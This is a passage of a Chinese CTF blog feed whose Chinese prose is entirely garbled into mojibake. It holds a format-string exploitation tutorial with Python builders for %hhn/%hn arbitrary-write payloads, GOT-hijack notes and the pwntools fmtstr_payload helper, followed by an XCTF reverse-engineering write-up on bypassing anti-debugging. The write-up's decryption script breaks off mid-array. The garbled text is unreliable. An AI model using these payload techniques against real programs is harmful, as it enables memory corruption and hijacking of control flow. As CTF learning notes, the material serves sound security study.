title="0x2"></a>0x2</h6><p>æ³„éœ²stack address ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/rBKqdw.png" srcset="/img/loading.gif" alt><br>æ­£å¦‚å›¾ä¸­æ‰€ç¤ºï¼Œä¼šå‘ç°æ ˆä¸Šè¯´æœ‰å¾ˆå¤šä¸espæ¥è¿‘çš„æ•°æ®ï¼Œåˆ©ç”¨åˆé€‚çš„æ•°æ®æ ¹æ®åç§»å°±ä¼šæ‹¿åˆ°espçš„å€¼ï¼Œç„¶åå°±å¾—åˆ°äº†satck addressã€‚å¸¸ç”¨çš„ä¹Ÿå°±æ˜¯å¤šå±‚å‡½æ•°è°ƒç”¨æ—¶ï¼Œç•™ä¸‹çš„ebpå€¼ã€‚</p><h3 id="è¦†ç›–å†…å­˜"><a href="#è¦†ç›–å†…å­˜" class="headerlink" title="è¦†ç›–å†…å­˜"></a>è¦†ç›–å†…å­˜</h3><p>è¦†ç›–å†…å­˜é€šå¸¸å…¶å®å°±æ˜¯æ”¹å†™å†…å­˜ï¼Œå…¶ä¸­åˆ†ä¸º<strong>æ”¹å†™æ ˆä¸Šçš„å†…å­˜å’Œä»»æ„åœ°å€çš„å†…å­˜</strong>ï¼Œä»è€Œæ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ï¼ˆè¿™é‡Œæˆ‘å…ˆåªè®°å½•ä¸€ä¸‹ä»»æ„åœ°å€çš„è¦†ç›–ï¼Œæ”¹å†™æ ˆä¸Šçš„å†…å­˜æš‚æ—¶ç”¨ä¸åˆ°ï¼‰<br>è¿™é‡Œé¢ä¸»è¦æ˜¯ä½¿ç”¨<code>%n</code>, %n  è½¬æ¢æŒ‡ç¤ºç¬¦ä¸è¾“å‡ºå­—ç¬¦ï¼Œå°† å½“å‰printfå‡½æ•°å·²ç»æˆåŠŸå†™å…¥æµæˆ–ç¼“å†²åŒºä¸­çš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚å…¶æ ¸å¿ƒå°±æ˜¯ï¼š<strong>å†™å…¥çš„å€¼ = å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°</strong> ï¼ŒçŸ¥é“è¿™ä¸ªä»¥åï¼Œå…¶<strong>ä½¿ç”¨èµ·æ¥å°±æ˜¯æ§åˆ¶å¥½åœ¨è¿™æ¬¡%nå‰è¾“å‡ºæ­£ç¡®çš„å­—ç¬¦æ•°</strong>ã€‚</p><h4 id="ä»»æ„åœ°å€è¦†ç›–"><a href="#ä»»æ„åœ°å€è¦†ç›–" class="headerlink" title="ä»»æ„åœ°å€è¦†ç›–"></a>ä»»æ„åœ°å€è¦†ç›–</h4><ul><li>ä½¿ç”¨æ–¹æ³•ç±»ä¼¼äº%sçš„ä»»æ„åœ°å€è¯»å–ï¼Œåªæ˜¯æ¢æˆäº†%nã€‚</li><li>ä½¿ç”¨%xcçš„åŠæ³•æ¥æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°ã€‚<br>åŸºæœ¬æ ¼å¼ï¼š <code>....[overwrite addr]....%[overwrite offset]$n</code><br>å…¶ä¸­<code>....</code> è¡¨ç¤ºæˆ‘ä»¬çš„å¡«å……å†…å®¹ï¼Œ<code>overwrite addr</code> è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ï¼Œ<code>overwrite offset</code> åœ°å€è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€å­˜å‚¨çš„ä½ç½®ä¸ºè¾“å‡ºå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¹Ÿå°±æ˜¯æ„é€ ä¸€ä¸ªéœ€è¦å†™å…¥çš„addressï¼Œç„¶åç”¨%xxcæ¥æ§åˆ¶å†™å…¥çš„å­—ç¬¦æ•°ï¼Œç„¶åæŠŠæ¡å¥½åç§»ã€‚</li></ul><h5 id="fmtå­—ç¬¦ä¸²å†™å…¥å¤§å°"><a href="#fmtå­—ç¬¦ä¸²å†™å…¥å¤§å°" class="headerlink" title="fmtå­—ç¬¦ä¸²å†™å…¥å¤§å°"></a>fmtå­—ç¬¦ä¸²å†™å…¥å¤§å°</h5><p>å› ä¸º%nåœ¨ä¸€æ¬¡çš„å†™å…¥æ˜¯åœ¨ä¸€æ¬¡å½“ä¸­å†™å…¥intå¤§å°çš„æ•´æ•°ï¼Œå½“ä½¿ç”¨%xcæ¥æ§åˆ¶è¾“å‡ºä¸€ä¸ªintå¤§å°çš„å­—ç¬¦ä¸ªæ•°ï¼Œè¿™ä¸ªprintfå‡½æ•°ä¼šè¾“å‡ºååˆ†å¤§çš„å­—ç¬¦æ•°é‡ï¼Œè¿™ä¸ªç»“æœå¯¹æˆ‘ä»¬è¯´ååˆ†ä¸åˆ©çš„ï¼Œä¸€æ–¹é¢è¿œç«¯ç¨‹åºè¾“å‡ºä»¥åï¼Œè‡ªå·±æ¥æ”¶æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œæ˜¯ååˆ†ä¸ç¨³å®šçš„ï¼Œå¹¶ä¸”æ— æ³•ç²¾å‡†çš„æ§åˆ¶éœ€è¦ä¿®æ”¹çš„åœ°æ–¹ã€‚<br>æ‰€ä»¥å¸¸ç”¨çš„æ˜¯%hn å’Œ%hhnï¼Œåˆ†åˆ«å†™å…¥shortå’Œcharå¤§å°çš„æ•´æ•°ï¼Œç„¶ååˆ†æˆå¤šæ¬¡å†™å…¥ä»¥ç»„åˆæˆå®Œæ•´çš„intæ•´æ•°ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯ååˆ†ç¨³å®šçš„ã€‚</p><h5 id="å•æ¬¡printfå¤šæ¬¡å†™å…¥"><a href="#å•æ¬¡printfå¤šæ¬¡å†™å…¥" class="headerlink" title="å•æ¬¡printfå¤šæ¬¡å†™å…¥"></a>å•æ¬¡printfå¤šæ¬¡å†™å…¥</h5><p>åœ¨è¿›è¡ŒGOT hijackæˆ–è€…æ”¹æ‰æŸä¸€ä¸ªæŒ‡æ ‡çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šè¦æ±‚ä¸€æ¬¡printfå†…å°±è¦æ¥æ”¹å†™å®Œæˆï¼Œä¸ç„¶æ”¹ä¸€åŠçš„å€¼è¿™ä¸ªæŒ‡æ ‡å†è¢«ä½¿ç”¨æ—¶ç¨‹åºå¾ˆå®¹æ˜“å´©æºƒã€‚<br>æ‰€ä»¥å°±å¯ä»¥æŠŠå¤šä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ç»“åˆåœ¨ä¸€æ¬¡ï¼Œä¾‹å¦‚ï¼š</p><div class="hljs"><pre><code class="hljs python">%xc%offset1$hn %yc%offset2$hn address address+<span class="hljs-number">2</span></code></pre></div><p>ä½†è¿™æ ·å°±è¯´éœ€è¦å°å¿ƒåç§»ï¼Œå¹¶ä¸”è¾“å‡ºçš„å­—ç¬¦æ•°ä¹Ÿè¦æ§åˆ¶å¥½ã€‚éš¾ç‚¹ä¹Ÿåœ¨æ§åˆ¶è¿™ä¸ªå¤šæ¬¡å†™å…¥æ—¶ï¼Œcå‰é¢åº”è¯¥å¡«å¤šå°‘çš„å€¼ã€‚</p><h5 id="å¤šæ¬¡å†™å…¥æ—¶æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°"><a href="#å¤šæ¬¡å†™å…¥æ—¶æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°" class="headerlink" title="å¤šæ¬¡å†™å…¥æ—¶æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°"></a>å¤šæ¬¡å†™å…¥æ—¶æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°</h5><p>è¦æ³¨æ„çš„æ˜¯<strong>%nå†™å…¥çš„å€¼æ˜¯å…¶å‰é¢è¾“å‡ºçš„å­—ç¬¦æ•°ã€‚</strong></p><ol><li><p>ç¬¬ä¸€æ¬¡%xc%hhnçš„æ—¶å€™ï¼Œè¦æ‰£æ‰å‰é¢æ‘†æ”¾çš„addressçš„é•¿åº¦ã€‚æ¯”å¦‚32ä½æ—¶ï¼Œå…¶å‰é¢ä¼šæ‘†æ”¾4ä¸ªåœ°å€ï¼Œè¿™ä¸ªæ—¶å€™å°±æ˜¯xéœ€è¦å‡å»4x4 = 16.</p></li><li><p>ä¹‹åæ¯ä¸ª%xc å¿…éœ€æ‰£æ‰å‰ä¸€ä¸ªå†™å…¥ byte çš„å€¼æ€»å­—ç¬¦æ•°æ‰ä¼šæ˜¯è¿™ä¸ªå†™å…¥éœ€è¦çš„é•¿åº¦ã€‚æ¯”å¦‚ ç¬¬ä¸€æ¬¡å†™å…¥å€¼ä¸º 90 ç¬¬äºŒä¸ªå†™å…¥ 120 æ­¤æ—¶åº”ä¸º<code>%30c% offset$hhn</code></p></li><li><p>å½“æŸä¸€æ¬¡å†™å…¥çš„å€¼æ¯”å‰é¢å†™å…¥çš„è¦å°çš„æ—¶å€™ï¼Œå°±éœ€è¦æ•´æ•°overflowå›æ¥ã€‚æ¯”å¦‚ï¼šéœ€è¦å†™å…¥çš„ä¸€ä¸ªå­—èŠ‚ï¼Œç”¨çš„æ˜¯hhnçš„æ—¶å€™ï¼Œå‰é¢é‚£æ¬¡å†™å…¥çš„æ˜¯0x80ï¼Œè¿™æ¬¡å†™å…¥çš„æ˜¯0x50ï¼Œè¿™æ—¶å€™å°±ç”¨0x50å¯ä»¥åŠ ä¸Š0x100ï¼ˆ256ï¼‰=0x150 ï¼ˆè¿™æ—¶å€™å› ä¸ºæ˜¯hhnï¼Œåœ¨æˆªå–çš„æ—¶å€™å°±æ˜¯æˆªå–çš„0x50ï¼‰ï¼Œ å†å‡å»0x80 = 0xD0ï¼ˆ208ï¼‰ï¼Œä¹Ÿå°±æ˜¯å¡«å…¥%208c%offset$hhnå³å¯ã€‚</p></li></ol><p>å½“ç„¶è¿™ä¹Ÿæ˜¯å¾ˆè§„å¾‹çš„ï¼Œåœ¨æ§åˆ¶ä¸€ä¸ªè¾“å‡ºå­—ç¬¦æ•°ï¼Œå°±åˆ†ä¸º3ç§æƒ…å†µï¼š</p><ul><li>å‰é¢å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°å°äºè¿™æ¬¡è¦è¾“å‡ºçš„å­—ç¬¦æ•°</li><li>å‰é¢å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°ç­‰äºäºè¿™æ¬¡è¦è¾“å‡ºçš„å­—ç¬¦æ•°</li><li>å‰é¢å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°å¤§äºè¿™æ¬¡è¦è¾“å‡ºçš„å­—ç¬¦æ•°</li></ul><p>ç„¶åå°±å¯ä»¥å†™æˆä¸€ä¸ªè„šæœ¬æ¥å®ç°è‡ªåŠ¨åŒ–æ§åˆ¶è¿™ä¸ªè¾“å‡ºå­—ç¬¦æ•°ï¼š</p><p>å•å­—èŠ‚ï¼š</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># prev å‰é¢å·²ç»è¾“å‡ºå¤šå°‘å­—ç¬¦</span><span class="hljs-comment"># val è¦å†™å…¥çš„å€¼</span><span class="hljs-comment"># idx  åç§»</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_byte</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">1</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hhn"</span>    <span class="hljs-keyword">return</span> result<span class="hljs-comment">#æ­é…ï¼š</span>prev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span><span class="hljs-comment"># xå°±æ˜¯ä½ è¦å†™å…¥çš„å­—èŠ‚æ•°ï¼Œä¾‹å¦‚åœ¨æ”¹å†™64ä½gotæ—¶å¸¸ç”¨æ˜¯6ï¼Œå› ä¸ºå…¶å‰ä¸¤ä¸ªå­—èŠ‚éƒ½ä¸€æ ·</span><span class="hljs-comment"># idxæ˜¯åç§»ï¼Œkeyæ˜¯è¦å†™å…¥çš„ç›®æ ‡å€¼</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(x):    payload +=fmt_byte(prev,(key &gt;&gt; <span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xff</span>,idx+i)     prev = (key &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span></code></pre></div><p>åŒå­—èŠ‚ï¼š</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#è·Ÿä¸Šä¸ªåŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯æ”¹äº†éƒ¨åˆ†åœ°æ–¹</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(x):    payload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,idx+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span></code></pre></div><p>åœ¨ä½¿ç”¨è¿™ä¸¤ä¸ªè„šæœ¬çš„æ—¶å€™ï¼Œå¸¸ç”¨çš„<strong>æ˜¯åœ¨è·å–åˆ°payloadçš„æ—¶å€™ä¹Ÿç”¨<code>payload.ljust()</code>åšå¥½padding,æ¥æ§åˆ¶å¥½å­—èŠ‚å¯¹é½ï¼Œç„¶åå†æ‘†ä¸Šéœ€è¦å†™å…¥xç»„çš„åœ°å€ã€‚ï¼ˆä¸€ä¼šåœ¨é¢˜ç›®ä¸­ä¼šæœ‰æ¼”ç¤ºï¼‰</strong></p><h5 id="pwntools-pwnlib-fmtstr-æ¨¡å—"><a href="#pwntools-pwnlib-fmtstr-æ¨¡å—" class="headerlink" title="pwntools pwnlib.fmtstr æ¨¡å—"></a>pwntools pwnlib.fmtstr æ¨¡å—</h5><div class="hljs"><pre><code class="hljs python">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=<span class="hljs-number">0</span>, write_size=<span class="hljs-string">'byte'</span>)</code></pre></div><ul><li>offset (int):ä½ æ§åˆ¶çš„ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–ç¨‹åºçš„åç§»é‡</li><li>writes (dict):æ ¼å¼ä¸º {addr: value, addr2: value2},ç”¨äºå¾€ addr é‡Œå†™å…¥ value (å¸¸ç”¨:<code>{printf_got}</code>)</li><li>numbwritten (int):å·²ç»ç”± printf å‡½æ•°å†™å…¥çš„å­—èŠ‚æ•°</li><li><code>write_size (str)</code>:å¿…é¡»æ˜¯ byte,short æˆ– intã€‚é™åˆ¶ä½ æ˜¯è¦é€ byte å†™,é€ short å†™è¿˜æ˜¯é€ int å†™(hhn,hnæˆ–n)</li></ul><p>è¿™ä¸ªå‡½æ•°æ˜¯ååˆ†å¥½ç”¨çš„ï¼Œå…·ä½“å¯ä»¥å»çœ‹ä¸€ä¸‹pwntoolsçš„å®˜æ–¹ä»‹ç»ï¼Œä½†æ˜¯å®é™…ä½¿ç”¨å½“ä¸­ï¼Œä¼šå‘ç°å‡ ä¸ªé—®é¢˜ï¼š</p><ul><li>åœ¨64ä½ä¸­ï¼Œå¹¶ä¸å¥½ç”¨ï¼Œè‡ªåŠ¨ç”Ÿæˆçš„payloadä¸­ï¼Œå®ƒä¸ä¼šå°†åœ°å€æ”¾åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹‹åï¼Œå¯¼è‡´ç”¨ä¸äº†ã€‚</li><li>åœ¨é¢å¯¹å•æ¬¡printfï¼Œå®æ–½å¤šæ¬¡å†™å…¥çš„æ—¶å€™å…¶æ›´æ˜¾çš„ååˆ†æ— åŠ›ã€‚</li></ul><p>è®°å½•åˆ°è¿™é‡Œï¼Œç†è®ºéƒ¨åˆ†å°±å·®ä¸å¤šå®Œäº†ï¼Œä¸‹ä¸€ç¯‡ä¸»è¦è®°å½•çš„å°±æ˜¯é¢˜è§£ç¯‡ï¼Œä¼šåŒ…å«ä¸€äº›æŠ€å·§ï¼Œå¸¸è§çš„ctfæ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ç›®æ¼æ´åˆ©ç”¨çš„å¸¸è§å¥—è·¯ï¼Œè¿˜æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„é«˜çº§åˆ©ç”¨ï¼ˆå½“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„bufåœ¨bssä¸Šï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬æ— æ³•ç›´æ¥å¾€æ ˆä¸Šå†™åœ°å€ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿå¹¶ä¸”è¿™ç§é¢˜ç›®å¸¸åœ¨èµ›é¢˜ä¸­å‡ºç°ï¼‰</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XCTF\_é«˜æ ¡æˆ˜ç–«èµ›\_RE-å¤©æ´¥å“</title>
    <link href="/2020/03/11/XCTF_%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E8%B5%9B_RE_%20%E5%A4%A9%E6%B4%A5%E5%9E%93/"/>
    <url>/2020/03/11/XCTF_%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E8%B5%9B_RE_%20%E5%A4%A9%E6%B4%A5%E5%9E%93/</url>
    
    <content type="html"><![CDATA[<h1 id="XCTF-é«˜æ ¡æˆ˜ç–«èµ›-RE-å¤©æ´¥å“"><a href="#XCTF-é«˜æ ¡æˆ˜ç–«èµ›-RE-å¤©æ´¥å“" class="headerlink" title="XCTF_é«˜æ ¡æˆ˜ç–«èµ›_RE_ å¤©æ´¥å“_"></a>XCTF_é«˜æ ¡æˆ˜ç–«èµ›_RE_ å¤©æ´¥å“_</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¤ç°ä¸€ä¸ªé¢˜ï¼Œå½“æ—¶åªåšå‡ºæ¥ç¬¬ä¸€å±‚åŠ å¯†ã€‚å› ä¸ºè¿˜æ²¡æ€ä¹ˆæ¥è§¦åè°ƒè¯•è·Ÿä»£ç æ··æ·†ï¼Œåšä¸ä¸‹å»äº†ï¼Œä¸è¿‡ä¸‹æ¥å¤ç°å‘ç°äº†è¾ƒä¸ºç®€å•çš„åŠæ³•å‡ºæ¥è¿™ä¸ªé¢˜ï¼Œä¹Ÿæ˜¯å­¦åˆ°å¾ˆå¤šï¼Œå°±è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="åˆæ­¥è¿è¡Œ"><a href="#åˆæ­¥è¿è¡Œ" class="headerlink" title="åˆæ­¥è¿è¡Œ"></a>åˆæ­¥è¿è¡Œ</h2><p>å‘ç°è¿˜éœ€è¦è£…ä¸ªcgwin1.dllï¼Œè¿™ä¸ªå¾ˆå¥½æ‰¾ï¼Œä¸è¿‡è¦æ³¨æ„64ä½ç³»ç»Ÿï¼Œwindowsç›®å½•ä¸‹çš„system32 è·Ÿsyswow64éƒ½è¦æ”¾å…¥ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/UJeTGU.png" srcset="/img/loading.gif" alt><br>çœ‹æ¥æ˜¯éœ€è¦è¾“å…¥åˆ¤æ–­ã€‚</p><h2 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/9N8fOI.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œå°±æ˜¯ç¬¬ä¸€å±‚éªŒè¯äº†ï¼Œåæ¥äº†è§£åˆ°è¿™ä¸ªæ˜¯smcåŠ å¯†ï¼Œæˆ‘æ˜¯ç›´æ¥å†™Pythonä¸€ä½ä½çˆ†ç ´å‡ºæ¥çš„ã€‚</p><div class="hljs"><pre><code class="hljs python">v39 = <span class="hljs-string">'Rising_Hopper!'</span>result = <span class="hljs-string">''</span>key = [<span class="hljs-number">17</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">42</span>,<span class="hljs-number">59</span>,<span class="hljs-number">47</span>,<span class="hljs-number">3</span>,<span class="hljs-number">47</span>,<span class="hljs-number">4</span>,<span class="hljs-number">16</span>,<span class="hljs-number">72</span>,<span class="hljs-number">62</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">16</span>]tag = [<span class="hljs-number">0x52</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x21</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    x = <span class="hljs-number">0</span>    flag = <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span> flag:        <span class="hljs-keyword">if</span> ~(x &amp; tag[i % <span class="hljs-number">14</span>]) &amp; (x | tag[i % <span class="hljs-number">14</span>])==key[i] :            flag = <span class="hljs-number">0</span>            result += chr(x)        <span class="hljs-keyword">else</span>:            x += <span class="hljs-number">1</span>print(result)<span class="hljs-comment">#result = 'Caucasus@s_ability'</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/KxEedJ.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/q0wQpI.png" srcset="/img/loading.gif" alt><br>ç„¶åè¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œå‘ç°è¿™é‡Œæ ¹æ®åˆšåˆšè§£å‡ºæ¥çš„å­—ç¬¦ä¸²ï¼Œä¼ å…¥åå¯¹*<em>Unk_10040164D *</em> åšäº†ä¸€äº›å¤„ç†ç„¶ååˆè¿”å›åˆ°è¿™å †æ•°æ®ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/bEqzBA.png" srcset="/img/loading.gif" alt><br>ç›´æ¥è·Ÿè¿›å»æ˜¯æ²¡ä»€ä¹ˆç”¨çš„ã€‚æ‰€ä»¥éœ€è¦åŠ¨æ€è°ƒè¯•ï¼Œçœ‹çœ‹ç¨‹åºè¿è¡Œåˆ°è¿™é‡Œï¼Œæ˜¯æ€ä¹ˆæ ·çš„ã€‚</p><p>ç„¶åä¼šå‘ç°ï¼ŒidaåŠ¨æ€è°ƒè¯•ç›´æ¥æ–­æ‰äº†ï¼Œè‚¯å®šæ˜¯æœ‰åè°ƒè¯•äº†ã€‚x64å¯ä»¥è°ƒè¯•ï¼Œä½†æ˜¯å®šä½å…³é”®å¤„æœ‰ç‚¹éš¾ï¼Œå¹¶ä¸”çœ‹æ±‡ç¼–ä»£ç ä¹Ÿè®©è‡ªå·±è¿™ä¸ªèœé¸¡çœ‹åäº†ã€‚æ‰€ä»¥å°±æƒ³åŠæ³•ç ´é™¤å¯¹idaçš„åè°ƒè¯•ï¼Œç„¶ååˆ°äº†å…³é”®ä»£ç ä¹Ÿå°±æ˜¯å¤„ç†ä»¥åçš„Unk10040164Dï¼Œçœ‹çœ‹é€»è¾‘æ˜¯ä¹Ÿæƒ³åŠæ³•<strong>å°†å…¶æ”¹å˜æˆä¼ªä»£ç </strong>ï¼Œè¿™æ ·å°±å¥½åˆ†æå¤šäº†ã€‚</p><h3 id="patchç¨‹åº"><a href="#patchç¨‹åº" class="headerlink" title="patchç¨‹åº"></a>patchç¨‹åº</h3><p>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/A43P7J.png" srcset="/img/loading.gif" alt><br>è·Ÿè¿›å…¥å¼•ç”¨å‡½æ•°ï¼Œå‘ç°æ˜¯åˆ©ç”¨çª—å£äº‹ä»¶æ¥æ£€æµ‹æ˜¯å¦è¢«è°ƒè¯•å™¨è°ƒè¯•ã€‚å¹¶ä¸”åœ¨å…¶ä¸­ä¹Ÿå‘ç°äº†idaï¼Œè¿™é‡Œpatchç¨‹åºå¯ä»¥ç”¨<strong>010editor</strong>ï¼Œç›´æ¥æŠŠidaçš„ç›¸å…³å­—çœ¼æ”¹æˆå…¶ä»–çš„å°±è¡Œã€‚ä½†æ˜¯è¦æ³¨æ„ä¸è¦ç ´åå…¶ä»–çš„æ•°æ®ï¼š<br>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/o7Pjq9.png" srcset="/img/loading.gif" alt><br>æˆ‘èµ·åˆæ”¹æˆè¿™æ ·å°±ä¸è¡Œï¼Œä½ä½å¯¹é½ï¼Œæ”¹æˆå…¶ä»–å­—ç¬¦ä¸²å°±å¥½äº†ã€‚</p><h3 id="idaåŠ¨æ€è°ƒè¯•ï¼š"><a href="#idaåŠ¨æ€è°ƒè¯•ï¼š" class="headerlink" title="idaåŠ¨æ€è°ƒè¯•ï¼š"></a>idaåŠ¨æ€è°ƒè¯•ï¼š</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/1biVvy.png" srcset="/img/loading.gif" alt><br>æ–­åœ¨è¿™é‡Œï¼Œç„¶åè¿›å…¥è¿™å…¥Unk10040164D å‡½æ•°çš„æ—¶å€™ï¼ŒF7è¿›å…¥ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/hyi1pE.png" srcset="/img/loading.gif" alt><br>å‘ç°å·²ç»æœ‰æ­£å¸¸çš„æ±‡ç¼–ä»£ç å‡ºæ¥äº†ï¼ˆè¿™é‡Œæˆ‘çš„æ˜¯å·²ç»ä¿®æ”¹è¿‡çš„ï¼‰ï¼Œæ— æ³•f5åç¼–è¯‘ï¼Œè¿™æ—¶å€™å¯ä»¥åœ¨æœ€åˆæ®µpush rbp ä¸Šé¢ï¼Œå³é”®æ–°å»ºä¸€ä¸ªå‡½æ•°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/rgwAq4.png" srcset="/img/loading.gif" alt><br>æ•´å®Œçš„æ ·å­ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/V3341J.png" srcset="/img/loading.gif" alt><br>ç„¶åå°±å¯ä»¥f5åç¼–è¯‘äº†ï¼Œå¹¶ä¸”å¾ˆæ¸…æ™°çš„å°±å¯ä»¥çœ‹å‡ºç¨‹åºé€»è¾‘ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/zuetQy.png" srcset="/img/loading.gif" alt><br>ç„¶åè§£å¯†è¿™é‡Œï¼š</p><div class="hljs"><pre><code class="hljs python">flag = <span class="hljs-string">''</span>key = [<span class="hljs-number">2007666</span>,<span class="hljs-number">2125764</span>,<span class="hljs-number">1909251</span>,<span class="hljs-number">2027349</span>,<span class="hljs-number">2421009</span>,<span class="hljs-number">1653372</span>,<span class="hljs-number">2047032</span>,<span class="hljs-number">2184813</span>,<span class="hljs-number">2302911</span>,<span class="hljs-number">0x2289F9</span>,<span class="hljs-number">1909251</span>,<span class="hljs-number">2165130</span>,<span class="hljs-number">1968300</span>,<span class="hljs-number">0x223D16</span>,<span class="hljs-number">2066715</span>,<span class="hljs-number">2322594</span>,<span class="hljs-number">1987983</span>,<span class="hljs-number">0x223D16</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">2066715</span>,<span class="hljs-number">0x2289F9</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">0xEB773</span>,<span class="hljs-number">0xE6A90</span>,<span class="hljs-number">0xE6A90</span>,<span class="hljs-number">0xE6A90</span>,<span class="hljs-number">728271</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">0x2289F9</span>,<span class="hljs-number">2283228</span>,<span class="hljs-number">0x223D16</span>,<span class="hljs-number">2184813</span>,<span class="hljs-number">2165130</span>,<span class="hljs-number">2027349</span>,<span class="hljs-number">1987983</span>,<span class="hljs-number">0x223D16</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">2283228</span>,<span class="hljs-number">2047032</span>,<span class="hljs-number">1909251</span>,<span class="hljs-number">2165130</span>,<span class="hljs-number">1869885</span>,<span class="hljs-number">2401326</span>,<span class="hljs-number">1987983</span>,<span class="hljs-number">0x223D16</span>,<span class="hljs-number">2184813</span>,<span 